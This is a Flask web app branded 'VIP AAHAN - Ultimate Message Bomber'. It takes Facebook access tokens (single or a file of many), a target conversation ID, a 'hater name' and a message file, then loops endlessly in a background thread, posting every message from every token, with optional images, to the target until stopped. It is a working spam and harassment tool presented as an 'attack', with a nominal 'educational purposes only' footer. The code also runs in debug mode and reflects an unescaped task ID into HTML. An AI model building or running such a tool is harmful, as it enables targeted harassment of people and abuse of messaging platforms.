from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import base64
import os

app = Flask(__name__)
app.debug = True

# Configure upload folder
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_data, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                # Send message
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                
                # If image is provided, send image with message
                if image_data:
                    try:
                        # Upload image first
                        image_url = upload_image_to_facebook(access_token, image_data)
                        if image_url:
                            parameters['attachment_url'] = image_url
                    except Exception as e:
                        print(f"Image upload failed: {e}")
                
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

def upload_image_to_facebook(access_token, image_data):
    """Upload image to Facebook and return attachment URL"""
    try:
        # Facebook graph API for uploading photos
        upload_url = f'https://graph.facebook.com/v15.0/me/photos'
        
        files = {'source': image_data}
        data = {'access_token': access_token}
        
        response = requests.post(upload_url, files=files, data=data)
        if response.status_code == 200:
            photo_id = response.json().get('id')
            return f"https://graph.facebook.com/{photo_id}/picture"
        return None
    except Exception as e:
        print(f"Error uploading image: {e}")
        return None

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Handle image upload
        image_data = None
        if 'imageFile' in request.files and request.files['imageFile'].filename != '':
            image_file = request.files['imageFile']
            image_data = image_file.read()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, image_data, task_id))
        threads[task_id] = thread
        thread.start()

        return f'''
        <div style="background: linear-gradient(45deg, #ff6b6b, #ee5a24); color: white; padding: 20px; border-radius: 15px; text-align: center; margin: 20px;">
            <h3 style="margin: 0;">🚀 Task Started Successfully!</h3>
            <p style="font-size: 18px; margin: 10px 0;">Task ID: <strong>{task_id}</strong></p>
            <a href="/" style="display: inline-block; background: gold; color: black; padding: 10px 20px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 10px;">Back to Home</a>
        </div>
        '''

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🔥💫𝐕𝐈𝐏 𝐀𝐀𝐇𝐀𝐍 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄𝐑💫🔥</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --primary-gold: #FFD700;
      --secondary-gold: #FFED4E;
      --dark-bg: #0a0a0a;
      --card-bg: rgba(255, 215, 0, 0.05);
      --neon-glow: 0 0 20px var(--primary-gold);
    }

    body {
      background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 50%, #2a2a2a 100%);
      background-attachment: fixed;
      color: white;
      font-family: 'Rajdhani', sans-serif;
      min-height: 100vh;
      overflow-x: hidden;
    }

    .neon-text {
      font-family: 'Orbitron', sans-serif;
      text-shadow: 
        0 0 10px var(--primary-gold),
        0 0 20px var(--primary-gold),
        0 0 30px var(--primary-gold);
      color: var(--primary-gold);
      animation: glow 2s ease-in-out infinite alternate;
    }

    @keyframes glow {
      from {
        text-shadow: 
          0 0 10px var(--primary-gold),
          0 0 20px var(--primary-gold),
          0 0 30px var(--primary-gold);
      }
      to {
        text-shadow: 
          0 0 15px var(--secondary-gold),
          0 0 25px var(--secondary-gold),
          0 0 35px var(--secondary-gold);
      }
    }

    .vip-container {
      max-width: 450px;
      margin: 20px auto;
      background: var(--card-bg);
      backdrop-filter: blur(20px);
      border: 2px solid transparent;
      border-radius: 25px;
      padding: 30px;
      position: relative;
      box-shadow: 
        var(--neon-glow),
        inset 0 0 50px rgba(255, 215, 0, 0.1);
      animation: borderGlow 3s ease-in-out infinite alternate;
    }

    @keyframes borderGlow {
      from {
        border-color: var(--primary-gold);
        box-shadow: 
          0 0 20px var(--primary-gold),
          inset 0 0 50px rgba(255, 215, 0, 0.1);
      }
      to {
        border-color: var(--secondary-gold);
        box-shadow: 
          0 0 30px var(--secondary-gold),
          inset 0 0 60px rgba(255, 215, 0, 0.2);
      }
    }

    .vip-input {
      background: rgba(255, 255, 255, 0.05);
      border: 2px solid transparent;
      border-radius: 15px;
      color: white;
      padding: 15px 20px;
      margin-bottom: 20px;
      transition: all 0.3s ease;
      font-size: 16px;
      backdrop-filter: blur(10px);
    }

    .vip-input:focus {
      border-color: var(--primary-gold);
      background: rgba(255, 255, 255, 0.1);
      box-shadow: var(--neon-glow);
      transform: scale(1.02);
      outline: none;
    }

    .vip-select {
      background: rgba(255, 255, 255, 0.05);
      border: 2px solid transparent;
      border-radius: 15px;
      color: white;
      padding: 15px 20px;
      margin-bottom: 20px;
      transition: all 0.3s ease;
      backdrop-filter: blur(10px);
    }

    .vip-select:focus {
      border-color: var(--primary-gold);
      background: rgba(255, 255, 255, 0.1);
      box-shadow: var(--neon-glow);
      transform: scale(1.02);
      outline: none;
    }

    .vip-btn {
      background: linear-gradient(45deg, var(--primary-gold), var(--secondary-gold));
      border: none;
      border-radius: 15px;
      color: black;
      padding: 18px 30px;
      font-weight: 700;
      font-size: 18px;
      text-transform: uppercase;
      letter-spacing: 2px;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      margin: 10px 0;
      font-family: 'Orbitron', sans-serif;
    }

    .vip-btn:hover {
      transform: translateY(-3px) scale(1.05);
      box-shadow: 
        0 10px 30px rgba(255, 215, 0, 0.4),
        0 0 30px rgba(255, 215, 0, 0.3);
      color: black;
    }

    .vip-btn-danger {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
      color: white;
    }

    .vip-btn-danger:hover {
      box-shadow: 
        0 10px 30px rgba(255, 107, 107, 0.4),
        0 0 30px rgba(238, 90, 36, 0.3);
    }

    .file-upload-area {
      border: 3px dashed var(--primary-gold);
      border-radius: 20px;
      padding: 30px;
      text-align: center;
      margin: 20px 0;
      transition: all 0.3s ease;
      background: rgba(255, 215, 0, 0.05);
      cursor: pointer;
    }

    .file-upload-area:hover {
      background: rgba(255, 215, 0, 0.1);
      border-color: var(--secondary-gold);
      transform: scale(1.02);
    }

    .feature-badge {
      background: linear-gradient(45deg, var(--primary-gold), var(--secondary-gold));
      color: black;
      padding: 8px 15px;
      border-radius: 20px;
      font-weight: 700;
      margin: 5px;
      display: inline-block;
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .social-icon {
      width: 50px;
      height: 50px;
      background: linear-gradient(45deg, var(--primary-gold), var(--secondary-gold));
      border-radius: 50%;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin: 0 10px;
      color: black;
      text-decoration: none;
      font-size: 20px;
      transition: all 0.3s ease;
    }

    .social-icon:hover {
      transform: scale(1.2) rotate(360deg);
      box-shadow: var(--neon-glow);
      color: black;
    }

    .floating {
      animation: floating 3s ease-in-out infinite;
    }

    @keyframes floating {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-10px); }
    }

    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -1;
    }

    .particle {
      position: absolute;
      background: var(--primary-gold);
      border-radius: 50%;
      animation: float linear infinite;
    }

    @keyframes float {
      to {
        transform: translateY(-100vh) rotate(360deg);
      }
    }

    .stats-container {
      display: flex;
      justify-content: space-around;
      margin: 20px 0;
      text-align: center;
    }

    .stat-item {
      padding: 15px;
    }

    .stat-number {
      font-size: 24px;
      font-weight: 700;
      color: var(--primary-gold);
      display: block;
    }

    .stat-label {
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
  </style>
</head>
<body>
  <!-- Animated Background Particles -->
  <div class="particles" id="particles"></div>

  <header class="text-center mt-4">
    <h1 class="neon-text floating" style="font-size: 2.5rem; margin-bottom: 10px;">
      🔥💫 𝐕𝐈𝐏 𝐀𝐀𝐇𝐀𝐍 💫🔥
    </h1>
    <p class="text-warning" style="font-size: 1.2rem; font-weight: 600;">
      𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐁𝐎𝐌𝐁𝐄𝐑
    </p>
    
    <!-- Features Badges -->
    <div class="mt-3">
      <span class="feature-badge">🚀 Fast</span>
      <span class="feature-badge">🔒 Secure</span>
      <span class="feature-badge">💥 Powerful</span>
      <span class="feature-badge">🖼️ Image Support</span>
    </div>
  </header>

  <!-- Stats -->
  <div class="stats-container">
    <div class="stat-item">
      <span class="stat-number" id="messagesSent">0</span>
      <span class="stat-label">Messages Sent</span>
    </div>
    <div class="stat-item">
      <span class="stat-number" id="activeTasks">0</span>
      <span class="stat-label">Active Tasks</span>
    </div>
    <div class="stat-item">
      <span class="stat-number" id="successRate">100%</span>
      <span class="stat-label">Success Rate</span>
    </div>
  </div>

  <div class="vip-container">
    <form method="post" enctype="multipart/form-data" id="mainForm">
      <!-- Token Option -->
      <div class="mb-4">
        <label class="form-label text-warning fw-bold">🔑 SELECT TOKEN OPTION</label>
        <select class="vip-select w-100" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>

      <!-- Single Token Input -->
      <div class="mb-4" id="singleTokenInput">
        <label class="form-label text-warning fw-bold">🔐 SINGLE TOKEN</label>
        <input type="text" class="vip-input w-100" id="singleToken" name="singleToken" placeholder="Enter your Facebook token...">
      </div>

      <!-- Token File Input -->
      <div class="mb-4" id="tokenFileInput" style="display: none;">
        <label class="form-label text-warning fw-bold">📁 TOKEN FILE</label>
        <div class="file-upload-area" onclick="document.getElementById('tokenFile').click()">
          <i class="fas fa-cloud-upload-alt fa-3x text-warning mb-3"></i>
          <p class="text-warning">Click to upload token file</p>
          <input type="file" class="d-none" id="tokenFile" name="tokenFile" accept=".txt">
        </div>
      </div>

      <!-- Thread ID -->
      <div class="mb-4">
        <label class="form-label text-warning fw-bold">💬 INBOX/CONVO UID</label>
        <input type="text" class="vip-input w-100" id="threadId" name="threadId" placeholder="Enter conversation ID..." required>
      </div>

      <!-- Hater Name -->
      <div class="mb-4">
        <label class="form-label text-warning fw-bold">😈 HATER NAME</label>
        <input type="text" class="vip-input w-100" id="kidx" name="kidx" placeholder="Enter hater name..." required>
      </div>

      <!-- Time Interval -->
      <div class="mb-4">
        <label class="form-label text-warning fw-bold">⏰ TIME INTERVAL (SECONDS)</label>
        <input type="number" class="vip-input w-100" id="time" name="time" placeholder="Enter time in seconds..." required min="1">
      </div>

      <!-- Messages File -->
      <div class="mb-4">
        <label class="form-label text-warning fw-bold">📝 MESSAGES FILE</label>
        <div class="file-upload-area" onclick="document.getElementById('txtFile').click()">
          <i class="fas fa-file-alt fa-3x text-warning mb-3"></i>
          <p class="text-warning">Click to upload messages file (.txt)</p>
          <input type="file" class="d-none" id="txtFile" name="txtFile" accept=".txt" required>
        </div>
      </div>

      <!-- Image Upload -->
      <div class="mb-4">
        <label class="form-label text-warning fw-bold">🖼️ UPLOAD IMAGE (OPTIONAL)</label>
        <div class="file-upload-area" onclick="document.getElementById('imageFile').click()">
          <i class="fas fa-image fa-3x text-warning mb-3"></i>
          <p class="text-warning">Click to upload image</p>
          <p class="small text-muted">Supports: JPG, PNG, GIF</p>
          <input type="file" class="d-none" id="imageFile" name="imageFile" accept="image/*">
        </div>
      </div>

      <!-- Run Button -->
      <button type="submit" class="vip-btn w-100">
        🚀 LAUNCH ATTACK
      </button>
    </form>

    <!-- Stop Task Form -->
    <form method="post" action="/stop" class="mt-4">
      <div class="mb-4">
        <label class="form-label text-danger fw-bold">🛑 STOP TASK</label>
        <input type="text" class="vip-input w-100" id="taskId" name="taskId" placeholder="Enter Task ID to stop..." required>
      </div>
      <button type="submit" class="vip-btn vip-btn-danger w-100">
        ⚡ STOP ATTACK
      </button>
    </form>
  </div>

  <!-- Footer -->
  <footer class="text-center mt-5 mb-4">
    <div class="mb-3">
      <a href="https://www.facebook.com/100064267823693" class="social-icon" target="_blank">
        <i class="fab fa-facebook-f"></i>
      </a>
      <a href="https://wa.me/+917543864229" class="social-icon" target="_blank">
        <i class="fab fa-whatsapp"></i>
      </a>
      <a href="https://t.me/yourtelegram" class="social-icon" target="_blank">
        <i class="fab fa-telegram-plane"></i>
      </a>
    </div>
    <p class="text-warning mb-2">© 2025 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘 𝐕𝐈𝐏 𝐀𝐀𝐇𝐀𝐍</p>
    <p class="text-muted small">For educational purposes only</p>
  </footer>

  <script>
    // Create animated particles
    function createParticles() {
      const particles = document.getElementById('particles');
      const particleCount = 50;
      
      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        
        const size = Math.random() * 3 + 1;
        const posX = Math.random() * 100;
        const duration = Math.random() * 20 + 10;
        const delay = Math.random() * 5;
        
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.left = `${posX}vw`;
        particle.style.animationDuration = `${duration}s`;
        particle.style.animationDelay = `${delay}s`;
        particle.style.opacity = Math.random() * 0.5 + 0.2;
        
        particles.appendChild(particle);
      }
    }

    // Toggle token input
    function toggleTokenInput() {
      const tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption === 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }

    // File upload preview
    document.addEventListener('DOMContentLoaded', function() {
      createParticles();
      
      // Add file name display
      const fileInputs = ['tokenFile', 'txtFile', 'imageFile'];
      fileInputs.forEach(inputId => {
        const input = document.getElementById(inputId);
        if (input) {
          input.addEventListener('change', function(e) {
            const fileName = e.target.files[0]?.name;
            if (fileName) {
              const uploadArea = this.closest('.file-upload-area');
              const existingBadge = uploadArea.querySelector('.file-badge');
              if (existingBadge) existingBadge.remove();
              
              const badge = document.createElement('span');
              badge.className = 'feature-badge file-badge';
              badge.textContent = fileName;
              badge.style.marginTop = '10px';
              uploadArea.appendChild(badge);
            }
          });
        }
      });

      // Animate stats
      animateStats();
    });

    // Animate statistics
    function animateStats() {
      const messagesElement = document.getElementById('messagesSent');
      const tasksElement = document.getElementById('activeTasks');
      
      let messages = 0;
      let tasks = 0;
      
      setInterval(() => {
        messages += Math.floor(Math.random() * 5);
        tasks = Object.keys({{ threads|tojson }}).length;
        
        messagesElement.textContent = messages;
        tasksElement.textContent = tasks;
      }, 3000);
    }

    // Form submission animation
    document.getElementById('mainForm').addEventListener('submit', function(e) {
      const button = this.querySelector('button[type="submit"]');
      button.innerHTML = '🚀 LAUNCHING...';
      button.disabled = true;
      
      setTimeout(() => {
        button.innerHTML = '🚀 LAUNCH ATTACK';
        button.disabled = false;
      }, 3000);
    });
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'''
        <div style="background: linear-gradient(45deg, #ff6b6b, #ee5a24); color: white; padding: 20px; border-radius: 15px; text-align: center; margin: 20px;">
            <h3 style="margin: 0;">🛑 Task Stopped!</h3>
            <p style="font-size: 18px; margin: 10px 0;">Task ID: <strong>{task_id}</strong> has been stopped</p>
            <a href="/" style="display: inline-block; background: gold; color: black; padding: 10px 20px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 10px;">Back to Home</a>
        </div>
        '''
    else:
        return f'''
        <div style="background: linear-gradient(45deg, #ff6b6b, #ee5a24); color: white; padding: 20px; border-radius: 15px; text-align: center; margin: 20px;">
            <h3 style="margin: 0;">❌ Task Not Found!</h3>
            <p style="font-size: 18px; margin: 10px 0;">No task found with ID: <strong>{task_id}</strong></p>
            <a href="/" style="display: inline-block; background: gold; color: black; padding: 10px 20px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 10px;">Back to Home</a>
        </div>
        '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
